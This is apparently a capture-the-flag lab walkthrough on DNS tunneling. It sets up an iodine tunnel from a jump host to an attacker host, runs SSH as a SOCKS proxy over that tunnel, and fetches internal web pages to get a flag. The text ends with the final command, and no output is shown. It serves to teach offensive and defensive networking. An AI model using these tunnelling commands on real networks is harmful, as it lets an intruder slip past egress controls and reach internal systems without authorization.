# DNS tunneling

This technique is also known as `TCP` over `DNS`, where an attacker encapsulates other protocols, such as HTTP 
requests, over the DNS protocol using the DNS Data Exfiltration technique. DNS Tunneling establishes a 
communication channel where data is sent and received continuously.

Star `iodined` server on the thm attacker host:

    thm@attacker$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com                                                                                                                                                                     
    Opened dns0
    Setting IP of dns0 to 10.1.1.1
    Setting MTU of dns0 to 1130
    Opened IPv4 UDP socket
    Listening to dns for domain att.tunnel.com

Start `iodine` client on the jump host:

    thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com
    [sudo] password for thm: 
    Opened dns0
    Opened IPv4 UDP socket
    Sending DNS queries for att.tunnel.com to 127.0.0.11
    Autodetecting DNS query type (use -T to override).
    Using DNS type NULL queries
    Version ok, both using protocol v 0x00000502. You are user #0
    Setting IP of dns0 to 10.1.1.2
    Setting MTU of dns0 to 1130
    Server tunnel IP is 10.1.1.1
    Testing raw UDP data to the server (skip with -r)
    Server is at 172.20.0.200, trying raw login: OK
    Sending raw traffic directly to 172.20.0.200
    Connection setup complete, transmitting data.
    Detaching from terminal...

Start another terminal and jump to the attacker host. SSH over DNS:

    thm@attacker:~$ sudo ssh thm@10.1.1.2 -4 -f -N -D 1080
    [sudo] password for thm: 
    The authenticity of host '10.1.1.2 (10.1.1.2)' can't be established.
    ECDSA key fingerprint is SHA256:Ks0kFNo7GTsv8uM8bW78FwCCXjvouzDDmATnx1NhbIs.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '10.1.1.2' (ECDSA) to the list of known hosts.
    thm@10.1.1.2's password: 

With this connection to the jump host over the `dns0` network, we can access resources:

    thm@attacker:~$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <address>Apache/2.4.41 (Ubuntu) Server at 192.168.0.100 Port 80</address>
    </body></html>

Get the flag:

    thm@attacker:~$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/test.php